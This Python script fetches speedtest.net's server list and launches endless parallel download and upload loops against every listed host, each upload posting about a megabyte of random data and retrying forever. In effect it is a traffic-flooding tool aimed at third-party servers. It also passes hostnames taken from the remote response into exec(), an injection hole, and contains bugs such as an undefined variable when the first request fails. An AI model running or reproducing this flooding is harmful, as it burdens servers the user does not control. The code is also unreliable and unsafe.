import requests
import time
import multiprocessing as mp
import os
import re


def down(url):
    while True:
        try:
            requests.get(url)
        except:
            print('download error')
            time.sleep(120)

def up(url):
    while True:
        try:
            requests.post(url=url,data={'key1':os.urandom(999999)})
        except:
            print('upload error')
            time.sleep(120)



if __name__ == '__main__':
    url = 'https://www.speedtest.net/api/js/servers?engine=js'
    try:
        host = requests.get(url)
    except:
        print('error')
    hosts = re.finditer(r'"host":"(.+?)"',host.text)
    i=1
    for host in hosts:
        exec("down_url{} = 'https://{}/download'".format(i,host.group(1)))
        exec("up_url{} = 'https://{}/upload'".format(i,host.group(1)))
        exec('print(down_url{})'.format(i))
        exec('p{} = mp.Process(target=down, args=(down_url{},))'.format(i,i))
        exec('p{}.start()'.format(i))
        exec('q{} = mp.Process(target=up, args=(up_url{},))'.format(i,i))
        exec('q{}.start()'.format(i))
        i+=1
    for i in range(1,20):
        exec('p{}.join()'.format(i))
        exec('q{}.join()'.format(i))